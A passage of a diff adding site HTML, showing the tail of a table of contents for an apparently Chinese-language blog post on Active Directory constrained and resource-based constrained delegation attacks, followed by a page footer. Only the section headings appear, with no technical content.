+              </ul>
+            </li>
+            <li><a href="#域约束委派">域约束委派</a>
+              <ul>
+                <li><a href="#环境配置-1">环境配置</a></li>
+                <li><a href="#域约束委派攻击利用">域约束委派攻击利用</a></li>
+                <li><a href="#其他-1">其他</a></li>
+              </ul>
+            </li>
+            <li><a href="#基于资源的域约束委派">基于资源的域约束委派</a>
+              <ul>
+                <li><a href="#环境搭建">环境搭建</a></li>
+                <li><a href="#寻找rbcd机器">寻找RBCD机器</a></li>
+                <li><a href="#提权">提权</a></li>
+                <li><a href="#参考">参考</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2023 The Marauders</span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
